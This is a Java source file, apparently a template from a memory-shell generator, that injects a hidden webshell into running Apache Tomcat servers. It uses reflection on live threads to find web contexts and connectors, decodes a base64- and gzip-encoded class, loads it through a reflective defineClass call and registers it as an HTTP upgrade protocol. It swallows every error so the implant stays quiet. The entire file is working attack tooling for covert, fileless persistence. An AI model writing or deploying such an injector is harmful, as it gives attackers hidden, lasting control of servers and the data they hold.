package org.leo.jmg.mem.injectortpl.tomcat;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/** Tomcat HTTP UpgradeProtocol 挂载器。 */
public class TomcatUpgradeInjector {
    private static String shellClassName;
    private static String shellClass;
    private static boolean ok;

    public TomcatUpgradeInjector() {
        if (ok) return;
        boolean installed = false;
        try {
            Set<Object> contexts = getContext();
            if (contexts != null) {
                for (Object context : contexts) {
                    try {
                        installed |= inject(context);
                    } catch (Throwable ignored) {
                    }
                }
            }
        } catch (Throwable ignored) {
        } finally {
            // 启动过早且尚未发现 Context 时保留重试机会。
            ok = installed;
            if (installed) {
                shellClass = null;
                shellClassName = null;
            }
        }
    }

    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            String threadName = thread.getName();
            if (threadName.contains("ContainerBackgroundProcessor")) {
                Map children = (Map) getFieldValue(
                        getFieldValue(getFieldValue(thread, "target"), "this$0"),
                        "children");
                addChildContexts(contexts, children);
            } else if (threadName.contains("Poller") && !threadName.contains("ajp")) {
                try {
                    Object proto = getFieldValue(getFieldValue(
                            getFieldValue(getFieldValue(thread, "target"), "this$0"),
                            "handler"), "proto");
                    Object engine = getFieldValue(getFieldValue(
                            getFieldValue(getFieldValue(proto, "adapter"), "connector"),
                            "service"), "engine");
                    addChildContexts(contexts, (Map) getFieldValue(engine, "children"));
                } catch (Throwable ignored) {
                }
            } else if (thread.getContextClassLoader() != null) {
                try {
                    ClassLoader loader = thread.getContextClassLoader();
                    if (loader.getClass().getSimpleName().matches(".+WebappClassLoader")) {
                        Object resources = getFieldValue(loader, "resources");
                        if (resources != null && resources.getClass().getName().endsWith("Root")) {
                            Object context = getFieldValue(resources, "context");
                            if (context != null) contexts.add(context);
                        }
                    }
                } catch (Throwable ignored) {
                }
            }
        }
        return contexts;
    }

    private static void addChildContexts(Set<Object> contexts, Map children)
            throws Exception {
        if (children == null) return;
        for (Object host : children.values()) {
            Object nested = getFieldValue(host, "children");
            if (nested instanceof Map) contexts.addAll(((Map) nested).values());
        }
    }

    private boolean inject(Object context) throws Exception {
        Object engine = getFieldValue(getFieldValue(context, "parent"), "parent");
        Object service = getFieldValue(engine, "service");
        Object connectors;
        try {
            connectors = invokeMethod(service, "findConnectors", null, null);
        } catch (Throwable ignored) {
            connectors = getFieldValue(service, "connectors");
        }
        if (connectors == null || !connectors.getClass().isArray()) return false;

        Object shell = null;
        boolean installed = false;
        for (int i = 0; i < Array.getLength(connectors); i++) {
            Object connector = Array.get(connectors, i);
            if (connector == null) continue;
            try {
                Object protocolHandler;
                try {
                    protocolHandler = invokeMethod(connector,
                            "getProtocolHandler", null, null);
                } catch (Throwable ignored) {
                    protocolHandler = getFieldValue(connector, "protocolHandler");
                }
                Object value = getFieldValue(protocolHandler, "httpUpgradeProtocols");
                if (!(value instanceof Map)) continue;
                Map protocols = (Map) value;
                if (protocols.containsKey(shellClassName)) {
                    installed = true;
                    continue;
                }
                if (shell == null) shell = getShell(context);
                protocols.put(shellClassName, shell);
                installed = true;
            } catch (Throwable ignored) {
                // AJP 等非 HTTP/1.1 Connector 没有 UpgradeProtocol Map。
            }
        }
        return installed;
    }

    private ClassLoader getWebAppClassLoader(Object context) {
        try {
            return (ClassLoader) invokeMethod(context, "getClassLoader", null, null);
        } catch (Throwable ignored) {
            Object loader = invokeMethod(context, "getLoader", null, null);
            return (ClassLoader) invokeMethod(loader, "getClassLoader", null, null);
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader loader = getWebAppClassLoader(context);
        Class clazz;
        try {
            clazz = Class.forName(shellClassName, true, loader);
        } catch (ClassNotFoundException ignored) {
            byte[] bytes = gzipDecompress(decodeBase64(shellClass));
            Method defineClass = ClassLoader.class.getDeclaredMethod(
                    "defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);
            clazz = (Class) defineClass.invoke(loader, bytes,
                    Integer.valueOf(0), Integer.valueOf(bytes.length));
        }
        return clazz.newInstance();
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String value) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64")
                    .getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class)
                    .invoke(decoder, value);
        } catch (Exception ignored) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class)
                    .invoke(decoder, value);
        }
    }

    public static byte[] gzipDecompress(byte[] compressed) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        GZIPInputStream gzip = new GZIPInputStream(new ByteArrayInputStream(compressed));
        try {
            byte[] block = new byte[4096];
            int read;
            while ((read = gzip.read(block)) > 0) output.write(block, 0, read);
            return output.toByteArray();
        } finally {
            gzip.close();
            output.close();
        }
    }

    public static Object getFieldValue(Object target, String name) throws Exception {
        Class type = target.getClass();
        while (type != null && type != Object.class) {
            try {
                Field field = type.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(target);
            } catch (NoSuchFieldException ignored) {
                type = type.getSuperclass();
            }
        }
        throw new NoSuchFieldException(name);
    }

    public static Object invokeMethod(Object target, String name,
                                      Class[] parameterTypes, Object[] arguments) {
        try {
            Class type = target instanceof Class ? (Class) target : target.getClass();
            Method method = null;
            while (type != null && method == null) {
                try {
                    method = type.getDeclaredMethod(name,
                            parameterTypes == null ? new Class[0] : parameterTypes);
                } catch (NoSuchMethodException ignored) {
                    type = type.getSuperclass();
                }
            }
            if (method == null) throw new NoSuchMethodException(name);
            method.setAccessible(true);
            return method.invoke(target instanceof Class ? null : target,
                    arguments == null ? new Object[0] : arguments);
        } catch (Exception e) {
            throw new IllegalStateException(name, e);
        }
    }
}
